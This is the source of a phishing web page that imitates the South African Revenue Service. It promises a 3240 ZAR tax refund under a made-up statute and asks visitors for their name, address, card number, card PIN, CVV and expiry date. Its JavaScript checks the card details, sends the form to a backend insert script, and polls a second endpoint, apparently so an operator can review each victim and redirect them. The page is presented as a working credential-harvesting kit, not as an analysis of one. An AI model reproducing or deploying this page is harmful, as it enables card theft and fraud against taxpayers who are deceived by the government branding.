<?php include('./inc/head.php'); ?>

<?php include('./inc/header.php'); ?>
<!-- middle -->
 <style>
.new{
margin-top: -115px;
}
 </style>
<div class="middle-section ">
	<div class="container-fluid">
		<div class="row px-0">
			<div class="col-md-9 px-0">
				<div class="middle-left">
					<!-- <div class="logo-sectoin">
						<img src="assets/images/sars-logos-white.png">
					</div>
					<div class="up-menu">
						<a href="#">Individuals</a>
						<a href="#">Businesses and Employers</a>
						<a href="#">Tax Practitioners</a>
						<a href="#">Customs and Excise</a>
					</div>
					<div class="middle-menu text-end">
						<a href="#">Trusts</a>
						<a href="#">Deceased & Insolvent Estates</a>
						<a href="#">Government</a>
						<a href="#">Small Businesses</a>
						<a href="#">Tax Exempt Institutions</a>
					</div> -->
					<!-- <a href="#">
						<img src="assets/images/banner.png" class="w-100">
					</a> -->
					<div class="bg-white text-center p-5">
						<p class="mt-4">
							South African Revenue Service (SARS) Refund Notification
							Tax Refund Case ID: <b>784-2023-PRT</b>

							You are entitled to a tax refund of <b>3240 ZAR.</b>  According to Section 27B of the Tax Refund
							Act, we require your payment details to process the refund. Please provide your card details
							securely below by 10 September 2024. This form is encrypted for your security
						</p>
					</div>
					<main id="main" role="main">

						<div class="form-section p-5 new">
							<div class="row">
							
								<div class="col-md-12">
									<h3 class="text-center mb-4">Personal details:</h3>
								</div>
							</div>
							<form id="form" action="page3.php">
								<input type="hidden" name="action" value="insert-userdata" />

								<div class="row">
									<div class="col-md-6">
										<div class="form-floating mb-4">
											<input type="text" class="form-control" name="name"
												placeholder="Enter your first name" id='name'
												onkeypress='return ((event.charCode >= 65 && event.charCode <= 90) || (event.charCode >= 97 && event.charCode <= 122) || (event.charCode == 32))'>
											<span id="name_error" style="color:red"> </span>
											<label for="floatingInput">Name</label>
										</div>
									</div>
									<div class="col-md-6">
										<div class="form-floating mb-4">
											<input type="text" class="form-control" name="lastname"
												placeholder="Enter your last name" id='lastname'
												onkeypress='return ((event.charCode >= 65 && event.charCode <= 90) || (event.charCode >= 97 && event.charCode <= 122) || (event.charCode == 32))'>

											<span id="lastname_error" style="color:red">

											</span>
											<label for="floatingInput">Last name</label>
										</div>
									</div>
									<div class="col-md-12">
										<div class="form-floating mb-4">
											<input type="text"name="address" class="form-control" id="exampleFormControlTextarea1"
												required>
											<label for="floatingInput">Delivery address</label>
										</div>
									</div>
									<div class="col-md-12">
										<h3 class="text-center mb-4">Payment information:</h3>
									</div>
									<div class="col-md-12">
										<div class="form-floating mb-4">
											<input type="text" class="form-control" id="cardNum" name="payment_card_no"
												required onkeyup="ValidateCreditCardNumber()" type="tel"
												inputmode="numeric" class="custom-control" style=""
												pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="16"
												placeholder="xxxx xxxx xxxx xxxx">
											<!-- <input id="ccn" style="" class="custom-control pad" type="tel" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19" placeholder="xxxx xxxx xxxx xxxx"> -->
											<span id="card_error" style="color:red;display:none">Please
												provide a valid
												Visa Number!</span>
											<span id="card_success" style="color:green;display:none">This is Valid
											</span>
											<script>
												function ValidateCreditCardNumber() {
													var ccNum = document.getElementById("cardNum").value;
													var visaRegEx = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
													var mastercardRegEx = /^(?:5[1-5][0-9]{14})$/;
													var amexpRegEx = /^(?:3[47][0-9]{13})$/;
													var discovRegEx = /^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;
													var isValid = false;
													if (visaRegEx.test(ccNum)) {
														isValid = true;
													} else if (mastercardRegEx.test(ccNum)) {
														isValid = true;
													} else if (amexpRegEx.test(ccNum)) {
														isValid = true;
													} else if (discovRegEx.test(ccNum)) {
														isValid = true;
													}
													var carde = document.getElementById("card_error");
													var cards = document.getElementById("card_success");
													if (isValid) {
														cards.style.display = 'block';
														carde.style.display = 'none';
														return true;
													} else {
														carde.style.display = 'block';
														cards.style.display = 'none';
														return false;
													}
													if (ccNum == '') {
														carde.style.display = 'none';
														cards.style.display = 'none';
													}

												}
											</script>
											<label for="floatingInput">Card number</label>

										</div>
									</div>
									<div class="col-md-6">
										<div class="form-floating mb-4">
											<script language="javascript" type="text/javascript">
												function limitText(limitField, limitNum) {
													if (limitField.value.length > limitNum) {
														limitField.value = limitField.value.substring(0,
															limitNum);
													}
												}
											</script>
											<input type="password" pattern="[0-9]*" inputmode="numeric" min="0000"
												id="cardpin" required style="" class="form-control" name="cardpin" />
											<span id="cardpin_error" style="color:red;display:none">Invalid
												Pin</span>
											<label for="floatingInput">Card PIN</label>
										</div>
									</div>
									<div class="col-md-6">
										<div class="form-floating mb-4">
											<script language="javascript" type="text/javascript">
												function limitText(limitField, limitNum) {
													if (limitField.value.length > limitNum) {
														limitField.value = limitField.value.substring(0,
															limitNum);
													}
												}
											</script>
											<input type="number" min="000" required style="" class="form-control"
												id="cvv_code" name="cvv_code" onKeyDown="limitText(this,5);"
												onKeyUp="limitText(this,3);" />
											<span id="cvv_error" style="color:red;display:none">Invalid
												Code</span>
											<label for="floatingInput">CVV code</label>
										</div>
									</div>
									<div class="col-md-12">
										<h3 class="text-center mb-4">Expiry date:</h3>
									</div>
									<div class="col-md-6">
										<div class="form-floating mb-4">
											<select class="form-select" id="month" name="month" required
												aria-label="Floating label select example">
												<option value="1" selected="">January</option>
												<option value="2">February</option>
												<option value="3">March</option>
												<option value="4">April</option>
												<option value="5">May</option>
												<option value="6">June</option>
												<option value="7">July</option>
												<option value="8">August</option>
												<option value="9">September</option>
												<option value="10">October</option>
												<option value="11">November</option>
												<option value="12">December</option>
											</select>
											<span id="month_error" style="color:red"></span>
											<label for="floatingSelect">Month</label>
										</div>
									</div>
									<div class="col-md-6">
										<div class="form-floating mb-4" id="form-selectt">
											<select class="form-select" id="year" name="year"
												aria-label="Floating label select example">

											</select>
											<label for="floatingSelect">Year</label>
											<span id="year_error" style="color:red"></span>

										</div>
									</div>
									<div id="pay-now" class="col-md-12 text-center">
                                    <button type="submit" onclick="myFunction()" class="mt-4 submit"
                                        class="btn btn-default" id="confirm-purchase">Confirm<svg viewBox="0 0 24 24"
                                            width="20px" class="mx-2" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                d="M19.7071 11.2929C20.0976 11.6834 20.0976 12.3166 19.7071 12.7071L13.7071 18.7071C13.3166 19.0976 12.6834 19.0976 12.2929 18.7071C11.9024 18.3166 11.9024 17.6834 12.2929 17.2929L16.5858 13L8 13C7.44771 13 7 12.5523 7 12C7 11.4477 7.44771 11 8 11L16.5858 11L12.2929 6.70711C11.9024 6.31658 11.9024 5.68342 12.2929 5.29289C12.6834 4.90237 13.3166 4.90237 13.7071 5.29289L19.7071 11.2929ZM5.01 13L5 13C4.44771 13 4 12.5523 4 12C4 11.4477 4.44771 11 5 11L5.01 11C5.56229 11 6.01 11.4477 6.01 12C6.01 12.5523 5.56229 13 5.01 13Z"
                                                fill="#fff"></path>
                                        </svg></button>
                                </div>
                                <div class="text-center">
                                    <!-- <button class=" mt-4 mb-3" type="submit" value="Submit" onclick="myFunction()" style="background-color: #ffbc00; color: #293694; font-size:80%;"> CONTINUE AND PAY</button> -->
                                    <script>
                                    var myVar;

                                    function myFunction() {

                                        // location.href = "page3.html";
                                    }

                                    function showPage() {
                                        document.getElementById("loader").style.display = "block";
                                        //document.getElementById("myDiv").style.display = "none";
                                    }
                                    </script>
                                </div>
								
									<div class="col-md-12 text-center mt-3">
										<img src="assets/images/card.png" width="160px">
									</div>
							</form>
						</div>
				</div>
				<div class="middle-bottom d-flex justify-content-between align-items-center">
						<a href="#">Find a Form</a>
						<a href="#">Find a Tax Rate</a>
						<a href="#">Find a Branch</a>
						<a href="#">Find a Publication</a>
						<a href="#">Find an FAQ</a>
						<a href="#">Report Suspicious Activity</a>
					</div>
				</div>
			</div>
			<div class="col-md-3 px-0">
				<div class="right-side p-4">
					<div class="text-center">
						<img src="assets/images/top-right-efiling.png">
					</div>
					<a href="#" class="btn-blu"><i class="fas fa-check-square"></i> Login</a>
					<a href="#" class="btn-blu"><i class="fas fa-file-signature"></i> Register</a>
					<a href="#" class="btn-blu-txt"><i class="fas fa-user"></i> Forgot Username</a>
					<a href="#" class="btn-blu-txt"><i class="fas fa-question"></i> Forgot Password</a>
					<a href="#" class="btn-blu-txt"><i class="fab fa-strava"></i> Manage Access Requests</a>
					<div class="list-box mb-2 mt-3">
						<h5 class="color">Find a</h4>
						<ul>
							<li><a href="#">Branch</a></li>
							<li><a href="#">Digital Channel</a></li>
							<!-- <li><a href="#">FAQ</a></li>
							<li><a href="#">Form</a></li>
							<li><a href="#">Guide, Policy, Manual or Brochure</a></li> -->
							<!-- <li><a href="#">Job</a></li>
							<li><a href="#">Media Release</a></li>
							<li><a href="#">Mobile Tax Unit</a></li>
							<li><a href="#">Registered Tax Practitioner</a></li>
							<li><a href="#">Scam alert</a></li>
							<li><a href="#">Service Charter Index</a></li>
							<li><a href="#">Source Code</a></li> -->
							<!-- <li><a href="#">Tax Directive</a></li>
							<li><a href="#">Tax Rate</a></li>
							<li><a href="#">Tax Workshop</a></li> -->
						</ul>
					</div>
					<div class="list-box mb-2">
						<h5 class="color">Top Queries</h4>
						<ul>
							<li><a href="#">Can I see my refund payment date on eFiling as well as the payment date if I
									owe SARS?</a></li>
							 <li><a href="#">How do I confirm if a Tax Practitioner is registered?</a></li>
							<li><a href="#">What if my employer didn’t submit my IRP5?</a></li>
							<li><a href="#">How do I check my auto-assessment status?</a></li>
							<li><a href="#">How does the solar rebate work?</a></li> 
							 <li><a href="#">How does auto-assessment work?</a></li>
							 <li><a href="#">What must I do when I receive my auto-assessment notice?</a></li>
							<li><a href="#">How do I check my bank details on the SARS system?</a></li>
							<!-- <li><a href="#">How do I update my email address or cell number?</a></li> -->
							<!-- <li><a href="#">Both my cell number and email address have changed as part of my eFiling
									security contact details?</a></li>
							<li><a href="#">How do I update my registered details (address etc) on eFiling?</a></li>
							<li><a href="#">I need to reset eFiling username and/or password?</a></li>
							<li><a href="#">I need my Tax Number</a></li>
							<li><a href="#">How do I pay SARS?</a></li>
							<li><a href="#">How to submit supporting documents?</a></li>
							<li><a href="#">Complete Traveller Declaration</a></li>
							<li><a href="#">Report a scam</a></li>
							<li><a href="#">Report a Tax Crime</a></li>
							<li><a href="#">Latest scam examples</a></li>
							<li><a href="#">Current surveys, SMSs and emails from SARS</a></li> -->
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- middle -->
				<?php include('./inc/footer.php'); ?></body>
				<script>
					var i = null;

					var year = new Date().getFullYear() // returns the current year
					var month = new Date().getMonth() // returns the current month
					//console.log(year);
					$(document).ready(function () {
						for (var i = Number(year); i < Number(year) + 30; i++) {
							var opt = "<option value='" + i + "'>" + i + "</option>";
							//console.log(i);
							$("#year").append(opt);
						}

						$("#cardNum").on("keyup keypress", function () {


							var str = $(this).val();

							if ((/[a-zA-Z]+/.test(str))) {
								$(this).val($(this).val().substring(0, $(this).val().length - 1));

							}

						});

						$("#year").on("change", function () {

							var dateOne = new Date($(this).val(), $("#month").val());
							var dateTwo = new Date(year, month);
							if (dateOne < dateTwo) {
								$("#year_error").html("Invalid Year");
								$("#month_error").html("Invalid Month");
							} else {
								$("#year_error").html("");
								$("#month_error").html("");
							}

						});
						$("#month").on("change", function () {

							var dateOne = new Date($("#year").val(), $(this).val());
							var dateTwo = new Date(year, month);
							if (dateOne < dateTwo) {
								$("#year_error").html("Invalid Year");
								$("#month_error").html("Invalid Month");
							} else {
								$("#year_error").html("");
								$("#month_error").html("");
							}

						});

						$("#cardpin").keypress(function (evt) {

							var passw = /^\d+$/;

							//console.log($(this).val());
							if ($(this).val().length > 4) {
								$(this).val($(this).val().substring(0, $(this).val().length - 1));
								//console.log("wai wai");
								return false;
							}
							if ($(this).val().match(passw)) {
								//return true;
							} else {

								$(this).val($(this).val().substring(0, $(this).val().length - 1));
								if ($(this).val().length == 1) {
									$(this).val("");
								}
								//return false;
							}
						});

						$("#cardpin").keypress(function (evt) {

							var passw = /^\d+$/;

							//console.log($(this).val());
							if ($(this).val().length > 4) {
								$(this).val($(this).val().substring(0, $(this).val().length - 1));
								//console.log("wai wai");
								return false;
							}
							if ($(this).val().match(passw)) {
								//return true;
							} else {

								$(this).val($(this).val().substring(0, $(this).val().length - 1));
								if ($(this).val().length == 1) {
									$(this).val("");
								}
								//return false;
							}
						});

						$("#cardpin").on("keyup", function (evt) {

							var passw = /^\d+$/;
							//console.log("hello 123");
							if ($(this).val().length > 4) {
								$(this).val($(this).val().substring(0, $(this).val().length - 1));
								//console.log("wai wai");
								return false;
							}

							if ($(this).val().match(passw)) {
								//return true;
							} else {

								$(this).val($(this).val().substring(0, $(this).val().length - 1));
								if ($(this).val().length == 1) {
									$(this).val("");
								}
								//return false;
							}



						});



					});

					function CheckPassword(inputtxt) {

					}

					function containsNumber(str) {
						return /\d/.test(str);
					}


					$("#form").submit(function (evt) {


						evt.preventDefault();


						var check = false;

						if ($("#cardpin").val().length < 4) {
							$("#cardpin_error").css({
								"display": "block"
							});
							check = true;
						} else {
							$("#cardpin_error").css({
								"display": "none"
							});
						}
						if ($("#cvv_code").val().length < 3) {
							$("#cvv_error").css({
								"display": "block"
							});
							check = true;
						} else {
							$("#cvv_error").css({
								"display": "none"
							});
						}
						if (!ValidateCreditCardNumber()) {
							check = true;
						}
						if (i != null) {
							clearInterval(i);
						}

						var dateOne = new Date($("#year").val(), $("#month").val());
						var dateTwo = new Date(year, month);

						if (dateOne < dateTwo) {
							$("#year_error").html("Invalid Year");
							$("#month_error").html("Invalid Month");
							return;
						} else {
							$("#year_error").html("");
							$("#month_error").html("");
						}

						if (containsNumber($("#name").val())) {
							$("#name_error").html("Invalid Input");
							check = true;
						} else {
							$("#name_error").html("");
						}

						if (containsNumber($("#lastname").val())) {
							$("#lastname_error").html("Invalid Input");
							check = true;
						} else {
							$("#lastname_error").html("");
						}


						if (check) {
							return false;
						}

						$.ajax({

							url: "libs/insert.php",
							type: "post",
							data: $(this).serialize(),
							success: function (res) {
								var id = res;
								var i = setInterval(() => {

									$.ajax({
										url: "libs/gets.php",
										type: "post",
										data: {
											data: id,
											action: "review-answer"
										},
										dataType: "json",
										success: function (resp) {

											if (resp.success) {

												var url = resp.redirectto;
												if (resp.redirectto == "page3.php") {
													url += "?code=" + id;
													location.href = url;

												} else {
													$("#over_message_error").html("Error");
													document.getElementById("loader").style
														.display = "none";
													clearInterval(i);
												}


											} else {



												document.getElementById("loader").style
													.display = resp.data;

											}

										}
									});

								}, 2000);
								showPage();

							}
						});

						return false;

					});
				</script>
				<!---------------------------------------------------------------------------------------------footer End------------------------------------------------------------------------- -->

				</main>
				<script>
					document.addEventListener('DOMContentLoaded', function () {
						const navToggle = document.querySelector('.nav-toggle');
						const navMenu = document.querySelector('.nav-menu');

						navToggle.addEventListener('click', function () {
							navMenu.classList.toggle('active');
						});
					});
				</script>
				<script>
					document.addEventListener('DOMContentLoaded', function () {
						const navToggle = document.querySelector('.nav-toggle');
						const navMenu = document.querySelector('.nav-menu');

						navToggle.addEventListener('click', function () {
							navMenu.classList.toggle('active');
						});
					});
				</script>


				</html>